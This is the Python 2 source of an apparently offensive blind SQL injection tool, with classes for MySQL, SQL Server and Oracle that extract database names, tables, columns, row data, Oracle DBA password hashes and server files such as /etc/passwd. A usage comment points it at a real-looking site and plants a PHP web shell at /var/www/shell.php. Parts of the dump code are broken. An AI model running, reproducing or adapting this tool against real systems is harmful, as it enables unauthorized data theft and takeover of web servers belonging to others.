#!/usr/bin/python
# -*- coding: utf-8 -*-
# sha0@badchecksum.net

#b = BlindMySQL()
#b.form = 'formuB'
#b.badguy = '0 Resultados'
#b.goodguy = 'hay resultados'
#b.outfile = 'out'
#b.post = 1
#b.param = 'busca'
#b.url = 'http://www.oxxx.org/alimentacion'
#b.getDatabases()
#b.getTables('database')
#b.getColumns('database','table')
#b.getData('database','table','user')
#b.getDataFiltered('database','table','user','admin','password')
#b.existsFile('/etc/passwd')
#b.getDocumentRoot()
#b.getFile('/etc/passwd')
#b.writeFile('/var/www/shell.php','<?php eval($_GET["cmd"]); ?>');
#b.isRoot()
#b.dumpTable()
#b.dumpAllDB()


'''
               Wordlist
                  |
               BlindSQL 
                  |
       -----------+----------------
       |          |               |
 BlindMySQL  BlindOracle    BlindMSSSQL

'''


__version__ = "$Revision: 0004000 $"

from util.wordlist import *
from mechanize import Browser
import re, sys

'''
	Core

'''


class BlindSQL(Wordlist):			#def 
	def __init__(self):
		Wordlist.__init__(self)
		self.b = Browser()
		self.b.set_handle_robots(False)
		self.r_x = re.compile('X')
		self.r_p = re.compile('%')
		#Configuration:
		self.goodguy=''
		self.badguy=''
		self.post = 0
		self.query=''
		self.form=''
		self.outfile=''
		self.param = ''
		self.debug=False
		self.other = {}
		self.url = ''
		self.extracted = []
		#Preapare Wordlist
		self.clear()
		#self.mins(1)
		
		self.vocales() # vocales primero
		self.consonantes()
		self.nums(9)
		self.words.append('*')
		self.words.append('.')
		self.words.append('$')
		self.words.append('-')
		
		'''
		problematica del byte _ en el retroceso, un nombre de columna puede contener este byte,
		pero también es un comodín, con lo que al hacer el retroceso, todas las queries daran true, 
		de manera que abran muchos falsos positivos. 
		'''
		
	def show(self):
		print "-----------------"
		print self.query
		print "Values:"
		for e in self.extracted:
			print e
			
	def setDebug(self,value):
		self.debug=value

	def _launch(self,query):	
		try:
			if self.post:
				self.b.open(self.url)
      				self.b.select_form(self.form)
      				self.b[self.param] = query
				for k in self.other.keys():
					self.b[k] = self.other[k]
      	 			r = self.b.submit()
			else:
				if self.debug:
					print self.url+self.encode(query)
				r = self.b.open(self.url+self.encode(query))
			return r.read()
		except:
			return ''
		
	def isSuccess(self,out):
		if len(self.badguy)+len(self.goodguy) == 0:
			print "You must select goodguy o bien badguy"
			sys.exit(1)
			
		if re.compile(self.goodguy).findall(out) or not re.compile(self.badguy).findall(out):
			return True

		return False

	def num(self):
		for n in self.words:
			query = self.r_x.sub(n,self.query)
			html = self._launch(query)
			#print query
			if not self.isSuccess(html):
			 	return
	
	def getData(self,table,column):	
		self.query = "'and'1'in(select'1'from "+table+" where "+column+" like 'X%')or'1'='2"
		self.blind()
		self.show()

	def encode(self,data):
		data = data.replace('%','%25')
		data = data.replace(' ','+')
		data = data.replace('(','%28')
		data = data.replace(')','%29')
		data = data.replace('\'','%27')
		data = data.replace('"','%22')
		return data
		
	def blindDicotomic(self,pos=1):
		
		min_num = 0     #10
		max_num =  255  #183
		middle = 96

		num = middle
		
		while True:				
			query = self.query.replace('#1',str(pos)).replace('#2',"<"+str(num))
			#print query
			html = self._launch(query)
			if self.isSuccess(html):
				middle = (abs(min_num-num)/2+min_num)
				max_num = num
				if num == middle:
					if num == 0:		
						print "end."
						return

					sys.stdout.write(chr(num))
					sys.stdout.flush()
					pos+=1
					min_num = 0     #10
					max_num =  255  #183
					middle = 96

				
				num = middle				
			else:
				middle = (abs(max_num-num)/2+num)
				min_num = num
				if num == middle:
					if num == 0:		
						print "end."
						return

					sys.stdout.write(chr(num))
					sys.stdout.flush()
					pos+=1
					min_num = 0     #10
					max_num =  255  #183
					middle = 96

				
				num = middle
				
				

				

	def blind(self,prefix=None):
		if not prefix:
			prefix = ''

		for a in self.words:
			query = self.r_x.sub(prefix+a,self.query)
			sys.stdout.write(prefix+a+"      \r")
			sys.stdout.flush()

			html = self._launch(query)
			if self.isSuccess(html):
				prefix += a
				#print "\r=>"+prefix
				prefix = self.blind(prefix)
				#break

		#No hay mas letras, confirmar si es un acierto:
		query = self.r_x.sub(prefix,self.query)
		query = self.r_p.sub('',query)		
		html = self._launch(query)
		if self.isSuccess(html):
			self.extracted.append(prefix)
			print "\r(ok)=>"+prefix
			if self.outfile != '':
				open(self.outfile,'a').write(prefix+'\n')	

		#if prefix[-1] == '_':
		#	return prefix[:-2]
		#else:
		return prefix[:-1]


	def console(self):
		while True:
			sys.stdout.write('SQL=>')
			query = sys.stdin.readline()[:-1]
			
			html = self._launch(query)
			if self.isSuccess(html):
				print "True"
			else:
				print "False"









'''
	MySQL
'''

class BlindMySQL(BlindSQL):				#def
	def __init__(self):
		BlindSQL.__init__(self)
		self.silent = False
		self.start = "'or 0 < ("
		self.terminator = ") or '1'='2"
	
	def getUser(self):
		 self.query = "%s select count(1) from information_schema.TABLES where user() like 'X%%' %s " % (self.start, self.terminator) 
		 self.blind()
		 self.show()
	
	def getDatabases(self): #TODO: hacer con scemata en vez de TABLES
		self.query = "%s select count(1) from information_schema.TABLES where table_schema like 'X%%' %s" % (self.start, self.terminator)
		#self.query = "'and'1'in(select'1'from information_schema.schemata where schema_name like 'X%')or'1'='2"
		self.blind()
		if not self.silent:
			self.show()
	
	def getTables(self,database):
		self.query = "%s select count(1) from information_schema.TABLES where table_name like 'X%%' and table_schema = '%s' %s" % (self.start, database, self.terminator)
		self.blind()
		if not self.silent:
			self.show()

	def getColumns(self,database,table):
		self.query = "%s select count(1) from information_schema.COLUMNS where column_name like 'X%%' and table_schema = '%s' and table_name = '%s' %s" % (self.start, database, table, self.terminator)
		self.blind()
		if not self.silent:
			self.show()

	def getData(self,database,table,column):
		self.query = "%s select count(1) from  %s.%s where %s like 'X%%' %s" % (self.start,database,table,column,self.terminator)
		self.blind()
		if not self.silent:
			self.show()	
			
	def getDataFiltered(self,database,table,where,column):
		self.query = "%s select count(1) from  %s.%s where %s and %s like 'X%%' %s" % (self.start,database,table,where,column,self.terminator)
		self.blind()
		if not self.silent:
			self.show()	
		
	def isRoot(self):
		query = "'or 'root' in ( select user() %s" % (self.terminator)
		html = self._launch(query)
		if self.isSuccess(html):
			return True
		return False
		#TODO
		
	
	def existsFile(self,filename):
		query = "%s select count(load_file('%s')) %s" %  (self.start, filename, self.terminator)
		html = self._launch(query)
		if self.isSuccess(html):
			print "Exists :)"
			return True
		else:
			print "Doesn't exist :("
			return False

	def getDocumentRoot(self):
		print "Scanning ..."
		for p in ['/var','/usr/local/www/apache22','/usr/local/','/usr/local','/srv','/usr/local/apache2','/usr/local/nginx','/home','/inetpub','/usr','/opt','/']:
			print p
			if self.existsFile(p):
				for pp in ['/data','/www','/wwwroot','/web','/htdocs','/html','/site','/website']:
					print "\t"+p+pp
					if self.existsFile(p+pp):
						print "Got it!!! "+p+pp    
						return

	
	def getFile(self,filename):
		
		if self.existsFile(filename):
			self.query = "'or  (select ascii(substr(load_file('%s'),#1,1))) #2 or '1'='2" % (filename)
			self.blindDicotomic()
		
		
		
	def writeFile(self,filename,content):
		pass #TODO
	
	def dumpTable(self,database,table):
		self.silent = True
		self.getColumns(database,table)
		columns = self.extracted 
		print "Columns:"
		for c in columns:
			print "\t%s" % c
		
		
		if len(columns) == 1: 
			self.show()
			return
				
		
		sys.stdout.write('Select index => ')
		idx_title = sys.stdin.readline()[:-1]	
		
		self.getData(database,table,idx_title)
		indexes = self.extracted
		print "-------------------------------------------------------"
		print "			%s.%s:" % (database,table)
		print "-------------------------------------------------------"
		for column in columns:
			sys.stdout.write(column+'\t\t')
		print "\n-------------------------------------------------------"
		
		for column in columns:
			for idx_value in indexes:
				if column != idx_title:
					self.getDataFiltered(database,table,idx_title,idx_value,column)
					for e in self.extracted:
						sys.stdout.write(e+'\t\t')
					print ""
					


	def dumpAllDB(self): # too heavy, use only on small databases TODO: arreglar output
		self.getDatabases();
		databases = self.extracted
		for database in databases:
			self.getTables(database)
			tables = self.extracted
			for table in tables:
				print "--- %s.%s: ---" % (database,table)
				self.getColumns(database,table)
				columns = self.extracted 
				
				self.getData(database,table,column[0])
				indexes = self.extracted
				
				if len(columns) == 1: 
					self.show()
					return
						
				for idx in indexes:
					for column in colunmns[1:]:
						self.getDataFiltered(database,table,column[0],idx,column)
						for e in self.extracted:
 							print "%s) %s=%s" % (idx,column,database,e)
					
	
					
		
'''
	Microsoft SQL Server
'''		
	
class BlindSQLServer(BlindSQL):		#def 
	def __init__(self):
		BlindSQL.__init__(self)

	def getDatabases(self):
		self.query = "'or'1'in(select'1'from sys.sysdatabases where name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getTables(self):
		self.query = "'or'1'in(select'1'from sys.sysobjects where xtype='u' and name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getColumns(self,table):
		self.query = "'or'1'in(select'1'from sys.syscolumns as c,sys.sysobjects as o where c.id=o.id and o.name='"+table+"' and c.name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getData(self,table,column):	
		self.query = "'or'1'in(select'1'from "+table+" where "+column+" like 'X%')or'1'='2"
		self.blind()
		self.show()





'''
	Oracle
'''

class BlindOracle(BlindSQL):
	def __init__(self):
		BlindSQL.__init__(self)

	def getUsersDBA(self):
		self.query = "1'and'1'in(select'1'from dba_users where username like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getPassword(self,user):
		self.query = "1'and'1'in(select'1'from dba_users where username = '"+user+"' and password like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getUsers(self):
		self.query = "1'and'1'in(select'1'from all_users where username like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getTables(self):
		self.query = "1'and'1'in(select'1'from all_tables where table_name like 'X%')or'1'='2"
		self.blind()
		self.show()
	
	def getUserTables(self):
		self.query = "1'and'1'in(select'1'from user_tables where table_name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getTablespace(self,table):
		self.query = "1'and'1'in(select'1'from all_tables where table_name = '"+table+"' and tablespace_name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getColumns(self,table):
		self.query = "1'and'1'in(select'1'from all_tab_columns where table_name = '"+table+"' and column_name like 'X%')or'1'='2"
		self.blind()
		self.show()

	def getData(self,table,column,cond=None):
		if cond:
			self.query = "1'and'1'in(select'1'from "+table+" where "+column+" like 'X%' and "+cond+")or'1'='2"
		else:
			self.query = "1'and'1'in(select'1'from "+table+" where "+column+" like 'X%')or'1'='2"
		self.blind()
		self.show()

